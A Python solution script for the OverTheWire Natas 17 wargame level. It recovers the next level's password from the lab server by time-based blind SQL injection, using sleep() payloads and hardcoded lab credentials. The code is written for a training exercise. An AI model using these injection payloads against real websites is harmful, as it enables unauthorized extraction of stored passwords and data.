import requests
import os

# time based blind SQL injection

def get_length():
    # guess the length of the password.
    counter = 1 
    password_found = False
    while not password_found:
        length_test = requests.get('http://natas17.natas.labs.overthewire.org/?username=natas18" and if((select length(password) from users where username="natas18")=' + str(counter) + ', sleep(2), 0)%23', auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
        if length_test.elapsed.total_seconds() > 2.0:
            password_found = True
        else:
            counter = counter + 1
    return counter

def brute_force(length):
    # when length is known, iterate over each position for the correct character.
    solution = ""
    for position in range(1, length + 1): 
        ascii_value = 48
        pos_found = False
        while not pos_found: 
            # had to use a longer sleep timer here because sometimes false positives were introduced. This wasnt an issue with the get_length function
            brute_forcer = requests.get('http://natas17.natas.labs.overthewire.org/?username=natas18" and if((select substring(password,' + str(position) + ',1) from users where username="natas18") like "' + chr(ascii_value) + '" collate latin1_general_cs, sleep(10), 0)%23', auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
            
            if brute_forcer.elapsed.total_seconds() > 10.0:
                pos_found = True
                solution = solution + chr(ascii_value)
                os.system('clear')
                print(solution)
            else:
                ascii_value = ascii_value + 1
                if ascii_value == 58:
                    ascii_value = ascii_value + 7
                elif ascii_value == 91: 
                    ascii_value = ascii_value + 6

    return True

length = get_length()
print(get_length())
brute_force(length)

